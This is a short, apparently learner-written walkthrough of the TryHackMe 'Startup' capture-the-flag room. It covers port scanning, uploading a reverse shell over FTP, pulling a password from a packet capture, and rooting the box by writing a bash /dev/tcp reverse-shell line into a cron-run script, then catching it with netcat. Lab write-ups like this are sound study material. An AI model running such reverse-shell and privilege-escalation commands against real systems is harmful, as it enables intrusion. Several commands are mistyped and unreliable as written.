                                                                                                                          This is a walkthrough of how how solved the Startup CTF on TryHackMe 

1. Connect With the TryHackMe server using Command  $ sudo openvpn Downloads/Ynos.ovpn
2. Confirm You can Connect to the Machine using the command $ ping (Ip of the machine)
3. Start the nmap scan with $ nmap -sV -O -T5 -p- 10.10.207.53 -oN Nmap.results
4. Nmap results show that the ftp server is open on this device 
5. While scanning this start dirbusting the website and you will find a directories named files and here you find among us memes and a hint of user named maya
6. The files of these can be accessed both through the website and ftp server
7. As there are no other weak points we will start by uploading the reverse-shell file on this server and then running it to gain access
8. You get acces of the data user from here 
9. While enumerating you will find the special ingredient and a hint of a user named lennie 
10. And a file named suspicious.pcapng
11. Enumerating this file we get access to the user lenni's pass i.e- c4ntg3t3n0ughsp1c3
12. We use ssh to gain the access of lennie 
13. Here we find the second flag 
14. Now we try to check the crontab of lennie or root ( services that are set to run on perodic intervals are registered on contab )
15. As we cannot gain access to this crontab we download the pspy64 for unprivilege process snoping 
16.So we upload the file on ftp server and download it on lennie's comp and  
17.  Find out that a process of lennie's is running on a perodic time of 1 minutes 
18. So we paste the bash reverse shell command on lenni's machine using the command $echo ‘bash -i >& /dev/tcp/10.23.132.255/4242’ > etc/print.sh 
19. And start netcat in another termianl using command $ nc -nclp 4242 
20. And in under a minute we will gain access to the root user
